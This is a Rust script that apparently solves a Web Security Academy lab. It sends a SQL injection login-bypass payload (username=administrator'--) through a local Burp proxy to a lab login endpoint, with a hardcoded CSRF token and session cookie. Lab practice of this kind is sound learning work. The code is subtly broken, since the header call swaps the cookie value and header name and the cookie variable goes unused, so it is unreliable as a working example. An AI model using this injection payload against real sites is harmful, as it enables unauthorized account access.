use reqwest::{self};
use reqwest::header::COOKIE;
use std::fs::File;
use std::io::Read;


// tokio let's us use "async" on our main function
#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Create a reqwest Client
    let mut buf = Vec::new();
    //this finds the burp cert and reads it 
    let _file = File::open("/home/redbeard/Downloads/cacert.der")?
                .read_to_end(&mut buf).unwrap();


    let cert = reqwest::Certificate::from_der(&buf).unwrap();

    //This sends everything through burp 
    let client = reqwest::Client::builder()
        .proxy(reqwest::Proxy::all("http://127.0.0.1:8080").unwrap())
        .add_root_certificate(cert)
        .build().unwrap();


    // URL of the endpoint for the sqli
    let url = "https://0a6f00fd0361102580714474005e00eb.web-security-academy.net/login";

    let body = "csrf=niQ9D7M6goiy9mpFNQN2wZGi7GaUiNRR&username=administrator'--&password=jim";
    let cookie = "session=ONaz9hrysDv5TTrNgGrWzRBKcYhUvRWQ";
    

    // Send the HTTP request and handle the response
    let response = client.post(url)
    .header( "session=ONaz9hrysDv5TTrNgGrWzRBKcYhUvRWQ", COOKIE)
    .body(body)
    .send()
    .await?;

    // Check if the response was successful (status code 2xx)
    if !response.status().is_success() {
        eprintln!("Request failed with status code: {}", response.status());
        return Err("Request failed".into());
    }

     // Read the response body as text
     let _html = response.text().await?;

    Ok(())
}
